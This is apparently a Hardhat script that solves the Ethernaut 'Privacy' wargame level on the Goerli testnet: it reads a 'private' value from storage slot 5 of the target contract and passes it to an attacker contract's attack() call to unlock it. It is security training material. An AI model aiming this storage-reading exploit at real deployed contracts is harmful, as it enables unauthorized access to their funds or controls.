const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0xC8a66ED501D44E2bD83e0A3333861977dD8dD3f0";
const INSTANCE_ADDRESS = "0x546adC4E7B3AabfC10C14Acd80C107c724d56C66";
const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_RPC_URL);

async function main() {
    const privacyAttacker = await ethers.getContractAt("PrivacyAttack", ATTACKER_ADDRESS);
    const ethernautInstance = await ethers.getContractAt("Privacy", INSTANCE_ADDRESS);

    // bytes32[2] is stored in the slot 5 in the contract.
    let dataNumberThree = await provider.getStorageAt(INSTANCE_ADDRESS, 5);
    console.log("data3: ", dataNumberThree); 

    
    // Execute the attack transaction.
    const attackTx = await privacyAttacker.attack(dataNumberThree);
    const txReceipt = await attackTx.wait();
    console.log(txReceipt);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});